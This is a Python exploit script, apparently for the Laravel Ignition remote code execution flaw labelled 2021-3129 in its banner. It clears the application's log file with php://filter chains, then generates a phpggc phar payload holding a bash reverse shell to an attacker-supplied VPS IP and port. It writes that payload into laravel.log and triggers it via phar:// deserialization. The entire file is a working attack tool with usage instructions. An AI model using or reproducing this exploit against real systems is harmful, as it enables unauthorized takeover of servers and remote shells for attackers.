import requests
import sys
import base64
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning


if __name__ == '__main__':
    print(
"""
_______________   ________  ____          ________  ____________  ________ 
\_____  \   _  \  \_____  \/_   |         \_____  \/_   \_____  \/   __   \
 /  ____/  /_\  \  /  ____/ |   |  ______   _(__  < |   |/  ____/\____    /
/       \  \_/   \/       \ |   | /_____/  /       \|   /       \   /    / 
\_______ \_____  /\_______ \|___|         /______  /|___\_______ \ /____/  
        \/     \/         \/                     \/             \/          by ccdragon  
"""
    )
    # 防止奇怪问题
    if(sys.argv[1][-1]=='/'):
        sys.argv[1]=sys.argv[1][:-1]
    # 关闭ssl warning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


    # 用法 python exp.py url vps_ip vps_port
    print(sys.argv)
    clear_log_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0","Content-Type":"application/json"}
    # 先清空log(必须要2次)
    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
    if(a.status_code==200):
        print("清空log成功")
    # 生成并且尝试payload

    os.system("php -d 'phar.readonly=0' ./phpggc -p phar -o ./monolog1.phar monolog/rce1 system 'bash -c \"bash -i >& /dev/tcp/"+sys.argv[2]+"/"+sys.argv[3]+" 0>&1\"'")


    with open("monolog1.phar","rb") as f:
        a=f.read()
        a = base64.b64encode(a)
    b=""
    for i in a:
        b+="=%x=00" % i
    payload="A"*16+b.upper() #必须大写,添加A作为padding

    for i in range(6):
        test_payload=payload[i:]
        # print(test_payload)
        attack_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":test_payload}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload,verify = False)
        print(a.url)

        attack_payload2={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload2,verify = False)
        print(a.status_code)

        attack_payload3={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"phar://../storage/logs/laravel.log"}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload3,verify = False)
        if("cannot be empty" in a.text):
            print("攻击成功,请检查是否反弹到shell")
    print("攻击结束....")

    